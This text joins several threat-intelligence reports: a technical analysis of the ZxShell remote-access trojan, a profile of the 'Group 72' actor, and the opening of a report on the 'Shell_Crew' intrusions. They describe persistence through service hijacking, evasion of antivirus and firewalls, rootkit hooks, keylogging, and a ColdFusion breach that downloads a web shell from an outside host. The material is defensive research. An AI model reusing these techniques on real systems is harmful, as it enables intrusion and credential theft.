This group is sophisticated , well funded , and exclusively targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , and media sector .
The primary attack vectors are watering - hole , spear phishing , and other web - based attacks .
Frequently , a remote administration tool ( RAT ) is used to maintain persistence within a victim 's organization .
These tools are used to further compromise the organization by attacking other hosts inside the targets network .
ZxShell ( aka Sensocode ) is a Remote Administration Tool ( RAT ) used by Group 72 to conduct cyber - espionage operations .
Once the RAT is installed on the host it will be used to administer the client , exfiltrate data , or leverage the client as a pivot to attack an organization 's internal infrastructure .
Here is a short list of the types of tools included with ZxShell : Keylogger ( used to capture passwords and other interesting data ) Command line shell for remote administration Remote desktop Various network attack tools used to fingerprint and compromise other hosts on the network Local user account creation tools For a complete list of tools please see the MainConnectionIo section .
The following paper is a technical analysis on the functionality of ZxShell .
The analysts involved were able to identify command and control ( C2 ) servers , dropper and installation methods , means of persistence , and identify the attack tools that are core to the RAT 's purpose .
In addition , the researchers used their analysis to provide detection coverage for Snort , Fireamp , and ClamAV .
ZxShell has been around since 2004 .
There are a lot of versions available in the underground market .
We have analyzed the most common version of ZxShell , version 3.10 .
There are newer versions , up to version 3.39 as of October 2014 .
An individual who goes by the name LZX in some online forums is believed to be the original author of ZxShell .
Since ZxShell has been around since at least 2004 , numerous people have purchased or obtained the tools necessary to set up ZxShell command and control servers ( C & C ) and generate the malware that is placed on the victim 's network .
ZxShell has been observed to be distributed through phishing attacks , dropped by exploits that leverage vulnerabilities such as CVE-2011- 2462 , CVE-2013 - 3163 , and CVE-2014 - 0322 .
To illustrate the functionality of main ZxShell module , Let 's take a look at the following sample : MD5 : e3878d541d17b156b7ca447eeb49d96a SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c It exports the following functions , which are examined in greater detail below : DllMain Install UnInstall ServiceMain ShellMain ShellMainThread zxFunction001 zxFunction002 DllMain performs the initialization of ZxShell .
It allocates a buffer of 0x2800 bytes and copies the code for the ZxGetLibAndProcAddr function .
To copy memory , the memcpy function is invoked .
It is not directly used from msvcrt.dll but is instead copied to another memory chunk before being called .
Finally , the trojan Import Address Table ( IAT ) is resolved and the file path of the process that hosts the dll is resolved and saved in a global variable .
ZxShell.dll is injected in a shared SVCHOST process .
The Svchost group registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost is opened and the netsvc group value data is queried to generate a name for the service .
Before the malware can be installed a unique name must to be generated for the service .
The malware accomplishes this through querying the netsvc group value data located in the svchost group registry key which is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost .
At startup , Svchost.exe checks the services part of the registry and constructs a list of services to load .
Each Svchost session can contain multiple shared services that are organized in groups .
Therefore , separate services can run , depending on how and where Svchost.exe is started .
Svchost.exe groups are identified in the above registry key .
Each value under this key represents a separate Svchost group and appears as a separate instance when you are viewing active processes .
Each value is a REG_MULTI_SZ value and contains the services that run under that Svchost group .
Each Svchost group can contain one or more service names that are extracted from the following registry key , whose Parameters key contains a ServiceDLL value : HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service On a Windows machine , the netsvc group contains names of both existing and non - existing services .
ZxShell exploits this fact by cycling between each of the names , verifying the existence of the real service .
The service 's existence is verified with the ServiceExists function , which attempts to open the relative registry sub - key in HKLM\SYSTEM\CurrentControlSet\Services .
The first service name that is not installed on the system becomes the ZxShell service name .
A new service is then created using the service parser function ProcessScCommand .
ZxShell implemented its own version of the Windows SC command .
There are minor differences between the ZxShell implementation of this command and the original Windows one , but they are irrelevant for the purpose of the analysis The command used to install the service is : sc create < service name > < service name > `` % SystemRoot % \System32\svchost.exe -k netsvcs '' where < service name > is the chosen infected service name .
The installed service registry key is opened and the 2 values under its Parameter subkey are created .
These 2 values , ServiceDll and ServiceDllUnloadOnStop are needed for services that run in a shared process .
Before the service is started ChangeServiceConfig is called to modify the service type to shared and interactive .
If the service fails to start then a random service name formatted as netsvc_xxxxxxxx , where xxxxxxxx represent an 8-digit random hex value , is added to the netsvc group and the entire function is repeated .
This function is the entry point of the service .
It registers the service using the RegisterServiceCtrlHandler Windows API function .
The ZxShell service handler routine is only a stub : it responds to each service request code , doing nothing , and finally exits .
It sets the service status to RUNNING and finally calls the ShellMain function of ZxShell .
The ShellMain function is a stub that relocates the DLL to another buffer and spawns a thread that starts from ShellMainThreadInt at offset + 0xC0CD .
The ShellMainThreadInt function gets the HeapDestroy Windows API address and replaces the first 3 bytes with the RET 4 opcode .
Subsequently , it calls the FreeLibrary function to free its own DLL buffer located at its original address .
Because of this , the allocated heaps will not be freed .
It re - copies the DLL from the new buffer to the original one using the memcpy function .
Finally , it spawns the main thread that starts at the original location of ShellMainThread procedure , and terminates .
At this point , the ZxShell library is no longer linked in the module list of the host process .
This is important because if any system tool tries to open the host process it will never display the ZxShell DLL .
This thread implements the main code , responsible for the entire botnet DLL .
First , it checks if the DLL is executed as a service .
If so , it spawns the service watchdog thread .
The watchdog thread checks the registry path of the ZxShell service every 2 seconds , to verify that it has n't been modified .
If a user or an application modifies the ZxShell service registry key , the code restores the original infected service key and values .
The buffer containing the ZxShell Dll in the new location is freed using the VirtualFree API function .
A handle to the DLL file is taken in order to make its deletion more difficult .
The ZxShell mutex is created named @ _ ZXSHELL _ @ .
ZxShell plugins are parsed and loaded with the AnalyseAndLoadPlugins function .
The plugin registry key HKLM\SYSTEM\CurrentControlSet\Control\zxplug is opened and each value is queried .
The registry value contains the plugin file name .
The target file is loaded using the LoadLibrary API function , and the address of the exported function zxMain is obtained with GetProcAddress .
If the target filename is incorrect or invalid the plugin file is deleted and the registry value is erased .
That is performed by the function DeleteAndLogPlugin .
Otherwise , the plugin is added to an internal list .
Here is the data structure used to keep track of the plugins : The thread KeyloggerThread is spawned and is responsible for doing keylogging on the target workstation .
We will take a look at the keylogger later on .
Finally the main network communication function GetIpListAndConnect is called .
This function is at the core of the RAT 's network communication .
It starts by initializing a random number generator and reading 100 bytes inside the ZxShell Dll at a hardcoded location .
These bytes are XOR encrypted with the byte - key 0x85 and contains a list of remote hosts where to connect .
The data is decrypted , the remote host list is parsed and verified using the BuildTargetIpListStruct function .
There are 3 types of lists recognized by ZxShell : plain ip addresses , HTTP and FTP addresses .
If the list does not contain any item , or if the verification has failed , the ZxShell sample tries to connect to a hardcoded host with the goal of retrieving a new updated list .
Otherwise , ZxShell tries to connect to the first item of the list .
If ZxShell successfully connects to the remote host , the function DoHandshake is called .
This function implements the initial handshake which consists of exchanging 16 bytes , 0x00001985 and 0x00000425 , with the server .
The function GetLocalPcDescrStr is used to compose a large string that contains system information of the target workstation .
That information is the following : local hostname organization owner operating system details CPU speed total physical memory The string is sent to the remote host and the response is checked to see if the first byte of the response is 0xF4 , an arbitrary byte .
If it is , the botnet connection I / O procedure is called through the MainConnectionIo function .
Image 4 .
The GetLocalPcDescrStr and DoHandshake functions called beforestarting the command processing Otherwise , the ZxShell code closes the socket used and sleeps for 30 seconds .
It will then retry the connection with the next remote host , if there is one .
It is noteworthy that this function includes the code to set the ZxShell node as a server : if one of the hardcoded boolean value is set to 1 , a listening socket is created .
The code waits for an incoming connection .
When the connection is established a new thread is spawned that starts with the MainConnectionIo function .
The MainConnectionIo function checks if the Windows Firewall is enabled , sets the Tcp Keep Alive value and Non - blocking mode connection options and receives data from the remote host through the ReceiveCommandData function .
If the communication fails , ZxShell disables the firewall by modifying the registry key : HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile Then the connection is retried .
The received command is then processed by the ZxShell function with the ProcessCommand function .
The command processing function starts by substituting the main module name and path in the hosting process PEB , with the one of the default internet browser .
The path of the main browser of the workstation is obtained by reading the registry value : HKLM\SOFTWARE\Classes\HTTP\shell\open\command Image 5 .
Our test workstation use Windows Internet Explorer as default browser This trick renders identification by firewall more cumbersome .
A host firewall will recognize the outgoing connection as originated by the browser instead of the ZxShell service host process .
The browser process always performs outgoing connections and the firewall should n't block them .
The command processing is straightforward .
Here is the list of common commands : This set of functionality allows the operator complete control of a system .
Being able to transfer and execute files on the infected system means the attacker can run any code they please .
Further , the keylogging and remote desktop functionality allows the operator to spy on the infected machine , observing all keystrokes and viewing all user actions .
Unloads ZxShell and deletes all of the active components .
This simply deletes the ZxShell service key from the Windows registry ( using SHDeleteKey Api ) and all of the subkeys .
Finally , it marks ZxShell main Dll for deletion with the MoveFileEx Windows API .
This function is the supporting functionality for WinVNC .
To allow the VNC session to connect , the current network socket WSAProtcol_Info structure is written to a named pipe prior to calling zxFunction001 .
Once the named pipe has been created , CreateProcessAsUserA is called with the following as the CommandLine parameter : zxFunction001 modifies the current process memory , uses data contained in the named pipe to create a socket , and then executes the code that sends the remote desktop session to the server controller .
This function will either bind the calling process to a port or has the calling process connect to a remote host .
The function is called in the following manner : The functionality ( connect or bind ) depends on the data contained within the named pipe .
Unlike zxFunction001 , this is not used by any of the RAT commands in the zxshell.dll .
Apart from user - mode ZxShell droppers mentioned earlier , there is a file ( SHA256 : 1e200d0d3de360d9c32e30d4c98f07e100f6260a86a817943a8fb06995c15335 ) that installs a kernel device driver called loveusd.sys .
The architecture of this dropper is different from the others : it starts extracting the main driver from itself .
It adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver .
ZxShell opens the registry key that describes the disk class drivers : SYSTEM\CurrentControlSet\Control\Class\ { 4D36E967-E325 - 11CE - BFC1 - 08002BE10318 } It then adds the `` Loveusd.sys '' extracted driver name to the upper filter list .
In our analysed sample the `` Loveusd.sys '' driver is installed with the name `` USBHPMS '' .
Finally the driver is started using the ZwLoadDriver native API .
The ZxShell driver starts by acquiring some kernel information and then hooking `` ObReferenceObjectByHandle '' API .
Finally it spawns 2 system threads .
The first thread is the `` communication '' thread .
ZxShell employs a strange method for communication : it hooks the NtWriteFile API and recognizes 5 different special handle values as commands : 0x111111111 -- Hide `` Loveusd '' driver from the system kernel driver list 0x22222222 -- Securely delete an in - use or no - access target file - name 0x44444444 -- Unhook the ZwWriteFile API and hook KiFastCallEntry 0x55555555 -- Remove the ZxShell Image Load Notify routine 0x88888888 -- Set a special value called `` type '' in Windows registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain The second Loveusd system thread does a lot of things .
Its principal duties are to create the ZxShell main DLL in '' c : \Windows\System32\commhlp32.dll '' and to install the Kernel `` Load Image Notify routine '' .
The code then tries to kill each process and service that belongs to the following list of AV products : Symantec Firewall Norton ESET McAfee Avast Avira Sophos Malwarebytes Next , the ZxShell Load - Image Notify function prevents the AV processes from restarting .
The installation procedure continues in the user - mode dropper .
The ZxShell service is installed as usual , and the in - execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call .
This handle value is invalid : all the windows kernel handle values are by design a multiple of 4 .
The ZxShell hook code knows that and intercept it .
ObReferenceObjectByHandle is a Kernel routine designed to validate a target object and return the pointer to its object body ( and even its handle information ) , starting from the object handle ( even the user - mode one ) .
The hook installed by ZxShell implements one of its filtering routine .
It filters each attempt to open the ZxShell protected driver or the main DLL , returning a reference to the `` netstat.exe '' file .
The protection is enabled to all processes except for ones in the following list : Svchost.exe , Lsass.exe , Winlogon.exe , Services.exe , Csrss.exe , ctfmon.exe , Rundll32.exe , mpnotify.exe , update.exe .
If the type of the object that the system is trying to validate is a process , the hook code rewrites again the configuration data of the ZxShell service in the windows registry .
The last type of Kernel modification that ZxShell rootkit performs is the system call dispatcher ( KiFastCallEntry ) hook .
In this manner , ZxShell is able to completely hide itself , intercepting the following Kernel API calls : ZwAllocateVirtualMemory , ZwOpenEvent , ZwQueryDirectoryFile , ZwWriteFile , ZwEnumerateKey , and ZwDeviceIoControlFile .
Sample ( SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c ) is configured to act as a server .
The symbol `` g_bCreateListenSck '' is set to 1 .
This means that , as seen above , the ZxShell Dll is started in listening mode .
It connects to the first remote C & C that tries to contact it and succeeds in the handshake .
The encrypted IP address is '' 127.0.0.2 '' ( used as loopback ) and no connection is made on that IP address ( due to the listening variable set to 1 ) .
We used the ZxShell package for version 3.10 ( SHA256 : 1622460afbc8a255141256cb77af61c670ec21291df8fe0989c37852b59422b4 ) .The
convenient thing about this is that the CNC panel worked with any version , 3.10 and above .
The buttons are all in Chinese , with the help of Google Translate and keen detective skills ( read : button clicking ) , we ' ve deciphered the functionality .
When you start the controller , you need to set the port you want to listen on and if you ' ve set a password , add it here .
Once an infected machine connects , you see its information displayed in a selection box at the top .
There are some built in functions on the side for the more common features .
These include remote desktop , webcam spying , remote shell , and file management .
You can also select a host and type help for a full list of commands .
I have the same machine infected with two different version of ZxShell .
Sending the help command for each , you can see the extra features added between version 3.1 and 3.2 .
Keylogging , ZXARPS ( IP and URL spoofing ) , and SYNFlood are some of the interesting features added to version 3.2 .
We wrote a script to extract version info from the binaries we have .
3.100 : 914 3.200 : 152 3.210 : 118 3.220 : 14 3.390 : 3 In versions 3.1 -- 3.21 , the configuration info is xor encoded with 0x85 .
This configuration info can be changed with a tool included in the ZxShell package .
In versions 3.22 and 3.39 the routine changes .
The new xor encoding byte is 0x5B .
The data is stored in the last 0x100 bytes of the file .
The first 8 bytes of data are static .
Then there is the dll install name , the domain , and the port .
Knowing the obfuscation routines for this data we wrote a script to extract the URLs / IPs and ports stored .
The most common ports used are , 80 , 1985 , 1986 , and 443 .
1985 is the default port for the malware , 1986 is the lazy variation of that port .
Port 80 and 443 are the default ports for HTTP and HTTPS traffic .
The next most common is port 53 .
This is used in some of the newer 3.22 and 3.39 samples .
After that , the count for each port starts declining sharply .
The choices are interesting though , many correspond to what looks like the birth year of the controller ( ie .
years in the late 1980s and early 1990s ) , and others seem to match what year the malware was launched in ( ie .
in the 2000s , relatively close to the current year ) .
Since this malware dates back to around 2004 , there are many samples containing CNC URLs from the 3322.org page .
This page used to offer no - ip type hosting and was widely used by malware authors .
So much so that Microsoft did a takedown in 2012 .
A similar service , vicp.net , is also seen in many of the domains .
In the malware , if a domain is configured , it will retrieve domain.tld/myip.txt .
This file contains a list of IP addresses for the infected machine to connect back to .
Otherwise , if an IP address is configured , it will connect directly to that IP address .
We have written a simple C++ ZxShell Server that implements the communication and the handshake for the version 3.10 and 3.20 of the ZxShell DLL .
The implementation is quite simple : After the handshake , 2 threads that deal with data transfer are spawned .
Here we have some screenshots that show the Server and the ZxShell Keylogger in action : Our server has accepted a connection from a remote host The ZxShell keylogger has captured 2 user passwords ( gmail.com and amazon.com ) The last image shows a very interesting feature of the ZxShell keylogger : once installed and activated , the keylogger is able to catch each password that the user inserts in the login box of each website ( like Google , Amazon and so on … ) .
This makes the keylogger a perfect weapons for the attackers .
They will be able to steal and resell in the underground market the sensitive data of each victim .
Advanced persistent threats will remain a problem for companies and organizations of all sizes , especially those with high financial or intellectual property value .
Group 72 's involvement in Operation SMN is another example of what sort of damage that can be done if organizations are not diligent in their efforts to secure their networks .
ZxShell is one sample amongst several tools that Group 72 used within their campaign .
ZxShell is a sophisticated tool employed by Group 72 that contains all kinds of functionality .
Its detection and removal can be difficult due to the various techniques used to conceal its presence , such as disabling the host anti - virus , masking its installation on a system with a valid service name , and by masking outbound traffic as originating from a web browser .
While other techniques are also utilized to conceal and inhibit its removal , ZxShell 's primary functionality is to act as a Remote Administration Tool ( RAT ) , allowing the threat actor to have continuous backdoor access on to the compromised machine .
As our analysis demonstrates , ZxShell is an effective tool that can be ultimately used to steal user credentials and other highly valuable information .
The threat posed by ZxShell to organizations is one that can not be ignored .
Organizations with high financial or intellectual property value should take the time to ensure their security requirements are met and that employee 's are educated about the security threats their organizations face .
For additional information , please see our blog post .
Protecting Users from These Threats Advanced Malware Protection ( AMP ) is ideally suited to detect the sophisticated malware used by this threat actor .
CWS or WSA web scanning prevents access to malicious websites , including watering hole attacks , and detects malware used in these attacks .
The Network Security protection of IPS and NGFW have up - to - date signatures to detect malicious network activity by threat actors .
ESA can block spear phishing emails sent by threat actors as part of their campaign .
Initial connection from the infected computer 's perspective -- after it connects to the controller - The rules are on the first 8 bytes of the first two packets .
They are hard coded in the binaries .
The rest of the bytes are variable ( for example , 66664640 is a floating point version number of ZxShell ) .
Snort rules : These rules have been released in our community ruleset and can be downloaded and used directly , or via pulledpork from Snort.org These signatures are available within the ClamAV database .
Please run freshclam to ensure you stay updated with the latest coverage .
Here 's a list for some ZxShell functions for sample SHA256 : 1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c : Here is a non - exhaustive list of ZxShell samples that were analyzed for this report .
Here is a list of Domains organized by port .
This post is co - authored by Joel Esler , Martin Lee and Craig Williams Everyone has certain characteristics that can be recognised .
This may be a way of walking , an accent , a turn of phrase or a style of dressing .
If you know what to look for you can easily spot a friend or acquaintance in a crowd by knowing what characteristics to look for .
Exactly the same is true for threat actors .
Each threat actor group may have certain characteristics that they display during their attack campaigns .
These may be the types of malware that they use , a pattern in the naming conventions of their command and control servers , their choice of victims etc .
Collecting attack data allows an observer to spot the characteristics that define each group and identify specific threat actors from the crowd of malicious activity on the internet .
Talos security and intelligence research group collects attack data from our various telemetry systems to analyse , identify and monitor threat actors through their different tactics , techniques , and procedures .
Rather than give names to the different identified groups , we assign numbers to the threat actors .
We frequently blog about significant attack campaigns that we discover , behind the scenes we integrate our intelligence data directly into our products .
As part of our research we keep track of certain threat actor groups and their activities .
In conjunction with a number of other security companies , we are taking action to highlight and disrupt the activities of the threat actors identified by us as Group 72 .
Group 72 is a long standing threat actor group involved in Operation SMN , named Axiom by Novetta .
The group is sophisticated , well funded , and possesses an established , defined software development methodology .
The group targets high profile organizations with high value intellectual property in the manufacturing , industrial , aerospace , defense , media sectors .
Geographically , the group almost exclusively targets organizations based in United States , Japan , Taiwan , and Korea .
The preferred tactics of the group include watering - hole attacks , spear - phishing , and other web - based tactics .
The tools and infrastructure used by the attackers are common to a number of other threat actor groups which may indicate some degree of overlap .
We have seen similar patterns used in domain registration for malicious domains , and the same tactics used in other threat actor groups leading us to believe that this group may be part of a larger organization that comprises many separate teams , or that different groups share tactics , code and personnel from time to time .
It is possible that Group 72 has a vulnerability research team searching for 0-day vulnerabilities in Windows .
The group is associated with the initial attack campaigns utilising exploits for the following vulnerabilities CVE-2014 - 0322 and CVE-2012 - 4792 .
We have also observed them using SQL injection as part of their attacks , and exploits based on CVE-2012 - 1889 and CVE-2013 - 3893 .
Frequently the group deploys a remote access trojan ( RAT ) on compromised machines .
These are used both to steal data and credentials from compromised machines , and to use the machine as a staging post to conduct attacks against further systems on the network , allowing the attackers to spread their compromise within the organization .
Unlike some threat actors , Group 72 does not prefer to use a single RAT as part of their attacks .
We have observed the group to use the following RAT malware : Gh0st RAT ( aka Moudoor ) Poison Ivy ( aka Darkmoon ) HydraQ ( aka 9002 RAT aka McRAT aka Naid ) Hikit ( aka Matrix RAT aka Gaolmay ) Zxshell ( aka Sensode ) DeputyDog ( aka Fexel ) - Using the kumanichi and moon campaign codes Derusbi PlugX ( aka Destroy RAT aka Thoper aka Sogu ) HydraQ and Hikit , according to our data are unique to Group 72 and to two other threat actor groups .
While their operational security is very good , patterns in their domains can be identified such as seemingly naming domains after their intended victim .
We have observed domains such as companyname.attackerdomain.com and companyacronym.attackerdomain.com .
We have also observed similar patterns in the disposable email addresses used to register their domains .
These slips , among others , allow us to follow their activities .
Intriguingly we have observed the same email address being used in the activities of this and two other threat actor groups .
This may suggest that these three groups are indeed one unit , or possibly hint at shared staff or ancillary facilities .
We will post a follow up with more technical detail in the coming days .
ClamAV names and Snort Signature IDs detecting Group 72 RAT malware : Gh0stRat - Win . Trojan . Gh0stRAT , 19484 , 27964 PoisonIVY / DarkMoon - Win . Trojan . DarkMoon , 7816 , 7815 , 7814 , 7813 , 12715 , 12724 Hydraq - Win . Trojan . HyDraq , 16368 , 21304 HiKit - Win . Trojan . HiKit , 30948 Zxshell - Win . Trojan . Zxshell , 32180 , 32181 DeputyDog - Win . Trojan . DeputyDog , 28493 , 29459 Derusbi - Win . Trojan . Derusbi , 20080 Advanced Malware Protection ( AMP ) is ideally suited to detect the sophisticated malware used by this threat actor .
CWS or WSA web scanning prevents access to malicious websites , including watering hole attacks , and detects malware used in these attacks .
The Network Security protection of IPS and NGFW have up - to- date signatures to detect malicious network activity by threat actors .
ESA can block spear phishing emails sent by threat actors as part of their campaign .
The purpose of this report is to share actionable threat intelligence associated with an advanced adversary the RSA IR Team is tracking .
Threat intelligence related to advanced adversaries enables security practitioners to mitigate threat impact before the adversary becomes entrenched in an organization 's infrastructure .
If a breach has already occurred , threat intelligence bolsters incident investigation activities and expedites remediation ; ultimately reducing exposure times and minimizing potential data loss .
During recent engagements , the RSA IR Team has responded to multiple incidents involving a common adversary targeting each client 's infrastructure and assets .
The RSA IR Team is referring to this threat group internally as `` Shell_Crew '' ; however , they are also referred to as Deep Panda , WebMasters , KungFu Kittens , SportsFans , and PinkPanther amongst the security community .
Shell_Crew is generally known to utilize the following tactics , techniques , and procedures ( TTPs ) ;  Prevalent use of Web shells to maintain low level persistence in spite of determined remediation efforts ;  Occasional use of Web application framework exploits to achieve initial entry as opposed to traditional spearfishing attempts ;  Lateral movement using compromised credentials with RDP , psexec , or network connections in conjunction with scheduling jobs with the `` at '' command .
 Abuse of Code Signing infrastructure to validly sign custom backdoor malware ;  Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol ( RDP ) ;  Long history of IP / DNS telemetry allowing for historical research and link analysis ;  Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass proxy logging ;  Extensive use of time / date stomping of malicious files to hinder forensic analysis ; and  Malware leveraging compromised credentials to bypass authentication NTLM proxies ( proxy aware ) .
This emerging threat profile covers a sampling of observed indicators that have been derived by analyzing a variety of tools and malicious code collected during recent engagements involving Shell_Crew .
Included are details about an observed intrusion vector , entrenchment techniques , unique malicious files , and tools that are used by this adversary .
Additionally , the RSA IR Team has provided content in the form of a digital appendix that can be integrated into Security Analytics , the Enterprise Compromise Assessment Tool ( ECAT ) , or other security tools for rapid detection and visibility of indicators associated with Shell_Crew .
Shell_Crew has an affinity for exploiting web application vulnerabilities to gain access to the victim 's network and information systems .
In this section , we ' ve provided details pertaining to an instance where Shell_Crew breached a victim network through the exploitation of an Adobe ColdFusion directory traversal vulnerability ( CVE-2010 - 2861 ) .
This exploit allowed Shell_Crew to read the ' password.properties ' file containing the password hash of the ColdFusion ' administrator ' account .
After obtaining this password hash , Shell_Crew was able to recover the password associated with the administrative account , likely by using pre - computed rainbow tables .
Using the acquired administrator account credentials , Shell_Crew created a ColdFusion scheduled task to download a malicious Web shell to the ColdFusion server .
They then utilized this Web shell to upload additional Web shells , hash dumping tools , and other Trojans onto the system , as well as created a backdoor into the system for reentry .
Using the tools uploaded to the server , Shell_Crew dumped password hashes from the compromised system , performed network reconnaissance , and moved laterally to systems in the internal network using the compromised credentials with the pass - the - hash technique .
Figure 1 below illustrates the high level anatomy of this particular Shell_Crew attack .
th On 18 June , 2013 an attacker using IP address 184.71.210.4 connected to the ColdFusion Web server and exploited the Adobe ColdFusion directory traversal vulnerability , CVE-2010 - 2861 , to recover the contents of the password.properties file .
Figure 2 below depicts a log entry from the Web server that illustrates the initial point of exploitation .
The data highlighted in blue shows the directory traversal used to access the password.properties file .
In addition , the data highlighted with red ( zh - cn ) in the User - Agent indicates the language tag on the attacker 's system .
The password.properties file contained the hash value of the ColdFusion administrator account , which can be seen in Figure 3 below : Through review of log files found on the Web server , the RSA IR team identified that within 10 minutes of retrieving the password.properties file , Shell_Crew logged in to the ColdFusion management page using the recovered administrator account credentials .
This indicates that Shell_Crew quickly enumerated the password from the hash value found in the password.properties file .
Once logged in with the administrator account , Shell_Crew scheduled a job called `` test '' to download a file containing a ColdFusion Web shell from `` http : //mpe.ie/1234.zip '' and save it to the Web server 's local 1 directory D : \mywebsite\x.cfm .
The log entry from the Web server that shows scheduling of this job is visible in Figure 4 .
The file downloaded from the remote system to the ColdFusion server , 1234.zip , is a ColdFusion Web shell called `` cfm backdoor by ufo '' .
Once the Web shell was downloaded to the Web server by the ColdFusion job , the adversary was able to utilize the functionality of the Web shell to execute commands on the local system , illustrated in Figure 5 and Figure 6 .
Once Shell_Crew has a foothold into the victim 's network , they move to other systems within the environment to ensure multiple points for re - entry .
Some of the techniques used by Shell_Crew to further insert themselves into a victim 's environment are outlined in the next section of this report ; Entrenchment Techniques Shell_Crew uses a variety of techniques to entrench themselves in a victim 's network .
For purposes of this report , the term entrenchment is used to describe a technique used by the adversary that allows them to maintain unauthorized access into an enterprise despite attempted remediation efforts by the victim .
In addition to traditional Trojans that beacon out to a destination IP address , this adversary has also been observed utilizing the following entrenchment techniques ;  Installation of Web shells ;  Registering DLLs with Internet Information Services ( IIS ) ;  Modifying the ' System . Web.dll ' file ;  Trojan . Derusbi ; and  Utilizing the RDP backdoor ' sethc.exe ' .
This section of the report discusses each of these entrenchment techniques in further detail .
Web shells are files containing malicious code written in various Web scripting languages , such as JSP , CFM , ASP , ASPX , or PHP , that when hosted on a publicly accessible Web site allow an adversary such as Shell_Crew to gain remote access and perform various unauthorized activities on a compromised system and network .
A Web shell can be a stand - alone file that only contains Web shell code , or can be an insertion of malicious code directly into an existing legitimate Web site page , thus allowing the adversary to blend with normal traffic and files on the Web server .
Using Web shells has several advantages over traditional Trojans including :  Low detection rates from Anti - Virus programs due to the variety and customization of code ;  The inability to block or monitor an IP since connectivity can be initiated from any source address ; and  There is no beaconing activity from a Web shell .
The complexity of the Web shells used by Shell_Crew varies dramatically .
Figure 7 shows the contents of a simple Web shell identified during a recent engagement where Shell_Crew had uploaded the Web shell as a standalone file .
This one line of code allowed Shell_Crew to execute shell commands remotely on the Web server .
The red text depicted within the example has been changed as the password value used by Shell_Crew made reference to the name of the victim company .
Shell_Crew also uses more complex Web shells that contain hundreds of lines of code and offer advanced functionality equal to many capable Trojans .
This functionality can include capabilities such as :  File system traversal ;  File / folder upload , download , and modify ;  Command execution ;  Time stomp files / folder ;  Database connectivity ; and  Communication obfuscation ( typically Base64 or ASCII hex encoding ) .
Figure 8 below is a screenshot of the ColdFusion Web shell used by Shell_Crew as referenced in the Intrusion Vector section of this report .
This Web shell contains robust capabilities such as command execution , directory traversal , file uploads , and the ability to gather basic system information .
AppleWebKit/534.30 ( KHTML , like Gecko ) Chrome/12.0.742.112 Safari/534.30 Content - Type : application / x - www - form - urlencoded Accept : text / html , application / xhtml+xml , application / xml ; q=0.9 , * / * ; q=0 .
8 Accept - Encoding : gzip , deflate , sdch Accept - Language : en - US , en ; q=0.8 Accept - Charset : ISO-8859 - 1 , utf-8 ; q=0.7 , * ; q=0.3 cmd = cscript+D % 3A % 5Cmywebsite % 5Cbad % 5Cenable.vbs < /figure > Another entrenchment technique used by Shell_Crew on compromised systems is to register a DLL with IIS .
Figure 9 below is an example where a malicious DLL was registered with the IIS Web server using the command line .
The ScriptMaps.vbs 2 file is a built in function of IIS for running VBScripts , and is fully documented in MSDN .
This command line modification will ensure that any incoming request ( whether it is a GET , POST , HEAD , or TRACE ) with a .jna
extension , will be handled by the now registered malicious DLL , in the example in Figure 9 , myDLLname.dll .
This allows Shell_Crew to make different requests ; both in the request type , such as GET or POST , and the file being requested , making detection more difficult .
This method of using various request parameters can be coupled with erratic IP Addresses further decreasing the likelihood that the activity will be detected by conventional means .
Figure 10 depicts a sample request to a compromised Web server .
This entrenchment technique was discovered after Shell_Crew made POST requests to nonexistent Web pages on a Web server running IIS .
The POST requests always started with a marker string that looked like a hash value .
Requests to the same non - existent Web page without the marker would result in a code 404 , i.e .
page not found .
Figure 11 shows an example of a POST request sent by Shell_Crew to a non - existent webpage .
The typically benign .NET
Microsoft file ' System . Web.dll ' is an assembly that contains several namespaces .
When decompiled with a .NET
Decompiler ( such as .NET
Reflector ) the result will be hundreds of C # scripts .
Shell_Crew replaced the existing System . Web.dll with a version which contained changes to two C # scripts :  Disassembler\System . Web\System\Web\UI\PageHandlerFactory.cs  Disassembler\System . Web\System\Web\Util\default_aspx.cs The first script file PagehandlerFactory.cs contains adversary added code that looks for this marker in the content of the request : 4B39DD871AD56E6BFEC750C33138B985 .
When the marker is present , it lets default_aspx.cs handle the request that follows the marker .
Figure 12 highlights the modifications made to the PagehandlerFactory.cs file .
When called by the script PagehandlerFactory.cs , the file default_aspx.cs , which also contains code added by the adversary , performs the eval function on the request sent in the original POST request to the non - existent Web page .
In this instance , the POST request contained data that was Base64 encoded to obfuscate the malicious nature of the request , as shown in Figure 14 .
Below in Figure 15 is the decoded blue text from the POST request in Figure 14 .
Additionally , the actual command within the above POST request is also Base64 encoded .
Below in Figure 16 , the encoded text from the above POST request decoded .
The reply from the server to these POST requests is not obfuscated and could be found in Web server log files as shown in Figure 17 .
In addition to deploying traditional versions of what Symantec calls Trojan . Derusbi ( i.e .
samples that beacon to a hard- coded domain / IP address ) , this adversary deployed a custom version of this Trojan on perimeter servers .
Trojan . Derusbi typically consists of a DLL and driver file .
The driver of the customized Trojan . Derusbi variant in this example monitors all TCP ports that are utilized by various Windows services .
When a connection is established on any TCP port , the driver checks to see if it received a handshake packet .
The handshake packet contains a simple structure , which allows the Trojan to function even on busy Web servers .
When a handshake packet is received , the DLL also replies back with a handshake packet .
In addition to the handshake , this variant of Trojan . Derusbi also has an authentication step where the client must send the right password to the Trojan .
The communication protocol consist of a 24 byte header , and the data is compressed and obfuscated with 4-byte XOR key , which is dynamically generated for each transmission , and which is included in the 24-byte header .
This Trojan offers both typical and advanced Trojan functionalities , such as : file traversal , process start / terminate , upload / download , time stomping , and self - updating .
Analysis of customized Trojan . Derusbi variants utilized by Shell_Crew can be found in the below Malicious Files and Secondary Tools section .
